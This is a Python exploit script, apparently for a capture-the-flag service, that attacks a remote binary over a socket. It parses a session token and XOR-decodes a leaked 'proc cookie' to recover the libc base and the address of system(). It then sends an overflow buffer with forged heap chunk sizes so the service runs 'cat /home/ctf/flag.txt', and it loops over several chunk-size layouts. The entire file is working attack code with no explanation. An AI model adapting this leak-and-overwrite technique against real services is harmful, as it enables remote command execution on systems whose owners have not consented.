import socket, struct, sys, re
sys.path.insert(0, __file__.rsplit("\\",1)[0])
import client

HOST, PORT = sys.argv[1], int(sys.argv[2])
PUTS_OFF = 0x83cc0
SYSTEM_OFF = 0x52fd0
C = 0x5a5a5a5a41414141

def try_config(size1, size2, size3, label):
    s = socket.create_connection((HOST, PORT), timeout=8)
    banner = client.rd(s, 2.0)
    m = re.search(rb"session token: ([0-9a-f]{8})", banner)
    if not m:
        s.close(); return None
    token = int(m.group(1), 16)
    tok12 = (token & 0xffffffff) << 12
    client.TOKEN = token
    def pkt(ptype, payload, t=2.0):
        client.send_packet(s, ptype, payload)
        return client.rd(s, t)
    pkt(2, struct.pack("<I", (token ^ 0xc0ffee00) & 0xffffffff))
    pkt(3, struct.pack("<H", 1) + b"A")
    pkt(4, b"\x00\x00\x00")
    r = pkt(4, b"P")
    mm = re.search(rb"proc cookie: 0x([0-9a-f]+)", r)
    if not mm:
        s.close(); return None
    puts = (int(mm.group(1),16) ^ C ^ tok12) & 0xffffffffffffffff
    libc = puts - PUTS_OFF
    system = (libc + SYSTEM_OFF) & 0xffffffffffffffff

    cmd = b"cat /home/ctf/flag.txt\x00"
    ov = bytearray(0x100)
    ov[0x60:0x60+len(cmd)] = cmd
    struct.pack_into("<Q", ov, 0x80, system)
    if size1 is not None: struct.pack_into("<Q", ov, 0x18, size1)
    if size2 is not None: struct.pack_into("<Q", ov, 0x38, size2)
    if size3 is not None: struct.pack_into("<Q", ov, 0x58, size3)
    pkt(3, struct.pack("<H", 0x100) + bytes(ov))
    out = pkt(5, b"", t=4.0)
    flag = (b"PTITCTF{" in out)
    alive = b"packet type> " in out
    s.close()
    print(f"[{label}] sizes=({hex(size1) if size1 else None},{hex(size2) if size2 else None},{hex(size3) if size3 else None}) flag={flag} alive={alive} resp={out[:80]!r}")
    return flag

if __name__ == "__main__":
    import itertools
    configs = [
        (0x21, 0x20, 0x130, "both free"),
        (0x41, None, 0x131, "one 0x40 chunk inuse"),
        (0x41, None, 0x130, "one 0x40 chunk free"),
        (0x21, 0x21, 0x130, "two chunks, report free"),
        (0x21, 0x21, 0x131, "two chunks, report inuse"),
        (0x20, 0x20, 0x130, "two free 0x20, report free"),
    ]
    for s1,s2,s3,label in configs:
        try_config(s1,s2,s3,label)
